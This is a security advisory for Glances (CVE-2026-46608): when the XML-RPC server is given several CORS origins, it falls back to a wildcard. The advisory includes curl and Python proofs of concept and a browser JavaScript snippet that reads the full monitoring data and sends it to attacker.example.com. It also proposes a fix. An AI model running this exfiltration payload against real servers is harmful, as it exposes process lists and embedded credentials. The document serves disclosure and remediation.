# [H] Glances: XML-RPC Multi-Origin CORS Configuration Silently Falls Back to Wildcard (Incomplete Fix for CVE-2026-33533)

## Summary
Severity: High
Advisory: GHSA-87qc-fj39-wccr
CVE: CVE-2026-46608
CWE: CWE-183, CWE-942
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-87qc-fj39-wccr
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=0 <4.5.5

## Details
### Summary

The Glances XML-RPC server (`glances -s`) introduced a configurable CORS origin list in version 4.5.3 as a mitigation for CVE 2026-33533.  However, the implementation silently falls back to `Access-Control-Allow-Origin: *` whenever `cors_origins` contains more than one entry.  An operator who configures an explicit two-entry allowlist (e.g. two internal dashboard origins) intending to restrict browser access instead receives the unrestricted wildcard — the same exposure that the original CVE described.  A malicious web page served from any origin can issue a CORS simple request to `/RPC2` and read the full system monitoring dataset without the victim's knowledge.

---

### Details

**Affected file:** `glances/server.py`, class `GlancesXMLRPCServer`, line 113

**Direct URL (commit 04579778e733d705898a169e049dc84772c852da):**
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113

```python
# server.py  (GlancesXMLRPCServer.__init__)
cors_origins = self.args.cors_origins   # list from config / CLI

# Line 113 — the incomplete fix:
self.cors_origin = cors_origins[0] if len(cors_origins) == 1 else '*'
#                                                                  ^^^
# Any allowlist with 2+ entries collapses to the wildcard
```

The `cors_origin` value is then echoed back as the `Access-Control-Allow-Origin` response header for every request (line ~147 in the same file):

```python
self.send_header('Access-Control-Allow-Origin', self.cors_origin)
```

This means the CORS header is determined once at server startup and never compared against the actual `Origin` header sent by the browser.  Even if an operator sets:

```ini
# glances.conf
[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
```

the server responds with `Access-Control-Allow-Origin: *` to every request, including those from `https://attacker.example.com`.

**Single-origin wildcard** (the default, `cors_origins = *`) is also still in effect; the fix only helps if exactly one non-wildcard origin is configured.

**Confirmed on:** x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).

Test results:

| Origin sent              | ACAO header returned | Expected     |
|--------------------------|----------------------|--------------|
| `http://evil.example.com`| `*`                  | No header    |
| `https://dashboard.corp` | `*`                  | Reflected    |
| `https://grafana.corp`   | `*`                  | Reflected    |

---

### PoC

**Special configuration required**

The multi-origin collapse is only triggered when `cors_origins` contains two or more entries.  Create the following `glances.conf`:

```ini
# /tmp/glances_multiorigin.conf
[global]
check_update = false

[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
```

**Step 1 — Start the XML-RPC server using the config above**

```bash
glances -s -p 61209 -C /tmp/glances_multiorigin.conf
```

**Step 2 — Send a CORS simple request from a foreign origin**

```bash
curl -s -D - -X POST "http://TARGET_HOST:61209/RPC2" \
     -H "Content-Type: text/plain" \
     -H "Origin: http://evil.example.com" \
     -d '<?xml version="1.0"?>
         <methodCall><methodName>getAllPlugins</methodName></methodCall>'
```

**Expected (secure) response:**

```
HTTP/1.0 400 Bad Request
```

or no `Access-Control-Allow-Origin` header.

**Actual response:**

```
HTTP/1.0 200 OK
Access-Control-Allow-Origin: *
...
<?xml version='1.0'?>
<methodResponse>
  <params><param><value><array><data>
    <value><string>cpu</string></value>
    <value><string>mem</string></value>
    ...
  </data></array></value></param></params>
</methodResponse>
```

**Step 3 — Demonstrate the code-level collapse to wildcard**

```python
import sys
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
from glances.config import Config

c = Config('/tmp/glances_multiorigin.conf')
cors_list = c.get_list_value('outputs', 'cors_origins', default=['*'])
# Reproduces server.py line 113:
result = cors_list[0] if len(cors_list) == 1 else '*'

print('cors_origins config :', cors_list)
print('cors_origin applied :', result)
print('Is wildcard?        :', result == '*')
# cors_origins config : ['https://dashboard.corp.example.com', 'https://grafana.corp.example.com']
# cors_origin applied : *
# Is wildcard?        : True
```

**Browser-based exploitation**

Once the wildcard is confirmed, the original CVE-2026-33533 attack vector still applies in full.  A malicious page served to a victim whose browser can reach the Glances server can exfiltrate data as follows:

```javascript
// Runs in a page on http://evil.example.com
const payload = `<?xml version="1.0"?>
  <methodCall><methodName>getAll</methodName></methodCall>`;

fetch('http://GLANCES_HOST:61209/RPC2', {
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' },
  body: payload,
})
.then(r => r.text())
.then(data => {
  // 'data' contains hostname, OS, full process list, network interfaces, etc.
  fetch('https://attacker.example.com/collect?d=' + btoa(data));
});
```

This works as a CORS "simple request" (POST + `text/plain`) — no CORS preflight is triggered and the `*` wildcard allows the browser to read the response.

---

### Impact

**Vulnerability type:** CORS Misconfiguration / Bypass of CVE-2026-33533 mitigation (CWE-942)

**Who is impacted:** Any operator who:
1. Runs Glances in XML-RPC server mode (`glances -s`), *and*
2. Has configured two or more `cors_origins` entries in `glances.conf` believing
   they are restricting browser access.

Operators using the default single-wildcard configuration (`cors_origins = *`, which is the upstream default) remain affected by the original CVE-2026-33533 exposure (unrestricted cross-origin read).  The incomplete fix addresses only the narrow case of a single non-wildcard origin.

**Data exposed through the XML-RPC API** includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, passwords, and tokens), CPU/memory/disk/network statistics, listening ports, and Docker/Kubernetes container metadata.

**Impact:**
- **Confidentiality:** High — complete system monitoring data readable by any browser page.
- **Integrity:** None — read-only API.
- **Availability:** None — no denial-of-service component.

---

### Suggested Fix

Implement per-request origin reflection against the configured allowlist, as recommended by the W3C CORS specification and as done by modern CORS middleware (e.g. Starlette's `CORSMiddleware`):

```python
# server.py  — replace the single static self.cors_origin field with:

def _get_acao_header(self, request_origin: str) -> str | None:
    """Return the correct Access-Control-Allow-Origin value or None."""
    if not self.cors_origins or '*' in self.cors_origins:
        return '*'
    if request_origin in self.cors_origins:
        return request_origin
    return None   # do not send the header for unlisted origins

# In do_POST / send_response:
origin = self.headers.get('Origin', '')
acao   = self._get_acao_header(origin)
if acao:
    self.send_header('Access-Control-Allow-Origin', acao)
    self.send_header('Vary', 'Origin')
```

Additionally, consider retiring the legacy XML-RPC server in favour of the REST API (`glances -w`), which uses Starlette's `CORSMiddleware` correctly, and document the deprecation path.

---

### Responsible Disclosure

The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.

---

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

---

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr
- https://nvd.nist.gov/vuln/detail/CVE-2026-46608
- https://github.com/advisories/GHSA-87qc-fj39-wccr
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.5
- https://github.com/pypa/advisory-database/tree/main/vulns/glances/PYSEC-2026-2495.yaml
- https://pypi.org/project/glances
